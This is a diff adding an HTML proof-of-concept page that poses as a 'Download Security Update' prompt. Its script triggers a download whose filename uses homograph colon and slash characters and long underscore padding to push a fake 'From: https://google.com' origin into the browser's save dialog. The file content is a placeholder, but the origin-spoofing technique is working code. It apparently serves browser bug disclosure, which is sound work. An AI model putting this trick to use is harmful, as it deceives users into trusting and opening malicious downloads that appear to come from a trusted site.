@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC Browser Spoofing</title>
+</head>
+<body>
+    <h2>Download Security Update</h2>
+    <button onclick="handleSaveAs()">Download Now</button>
+    <p id="result"></p>
+
+    <script>
+      function handleSaveAs() {
+        const fileContent = "This is a malicious payload disguised as a PDF.";
+        // Menggunakan homograph characters dan spasi/underscore panjang untuk mendorong origin ke baris baru
+        const fileName = "Update_System_Files_Critical_Patch_v2.0.________________________________________________________________________________________________________ From∶ https∶⧸⧸google.com";
+
+        const blob = new Blob([fileContent], { type: "application/octet-stream" });
+        const url = URL.createObjectURL(blob);
+
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = fileName;
+
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+
+        URL.revokeObjectURL(url);
+        document.getElementById("result").innerText = `Download started for ${fileName}`;
+      }
+    </script>
+</body>
+</html>
